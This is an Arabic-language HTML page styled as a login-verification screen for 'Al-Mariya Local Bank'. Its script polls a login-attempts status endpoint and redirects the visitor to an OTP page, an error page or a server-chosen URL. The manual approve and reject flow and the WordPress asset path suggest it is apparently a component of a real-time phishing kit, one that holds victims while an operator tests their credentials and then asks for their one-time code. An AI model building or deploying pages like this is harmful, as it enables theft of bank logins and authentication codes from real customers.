<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جاري التحقق - بنك المارية المحلي</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a1628;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;}
.waiting-box{text-align:center;padding:40px 30px;max-width:420px;width:100%;}
.spinner{width:60px;height:60px;border:4px solid rgba(0,200,255,0.15);border-top:4px solid #00c8ff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 30px;}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.waiting-title{font-size:1.3rem;font-weight:700;color:#00c8ff;margin-bottom:12px;}
.waiting-sub{font-size:0.95rem;color:#6b7f9e;margin-bottom:8px;}
.waiting-dots{font-size:1.2rem;color:#6b7f9e;}
.waiting-dots span{animation:blink 1.4s infinite both;}
.waiting-dots span:nth-child(2){animation-delay:0.2s;}
.waiting-dots span:nth-child(3){animation-delay:0.4s;}
@keyframes blink{0%,80%,100%{opacity:0}40%{opacity:1}}
.bank-logo{margin-bottom:40px;}
</style>
</head>
<body>
<div class="waiting-box">
  <div class="bank-logo">
    <img src="/ar/wp-content/themes/framework/assets/client/img/logo-white-2.png" alt="بنك المارية المحلي" style="height:50px;object-fit:contain;">
  </div>
  <div class="spinner"></div>
  <div class="waiting-title">جاري التحقق من بياناتك</div>
  <div class="waiting-sub">يرجى الانتظار، نقوم بمراجعة معلوماتك</div>
  <div class="waiting-dots"><span>.</span><span>.</span><span>.</span></div>
</div>
<script>
(function() {
  var params = new URLSearchParams(window.location.search);
  var id = params.get('id');
  if (!id) { window.location.href = '/ar/login/'; return; }

  function checkStatus() {
    fetch('/api/login-attempts/' + id + '/status')
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.redirectUrl) {
          window.location.href = data.redirectUrl;
        } else if (data.status === 'rejected') {
          window.location.href = '/ar/login/?error=1&sid=' + id;
        } else if (data.status === 'approved') {
          window.location.href = '/ar/login/otp.html?id=' + id;
        } else if (data.status === 'not_found') {
          window.location.href = '/ar/login/';
        }
      })
      .catch(function() {});
  }

  setInterval(checkStatus, 2000);
  checkStatus();
})();
</script>
</body>
</html>
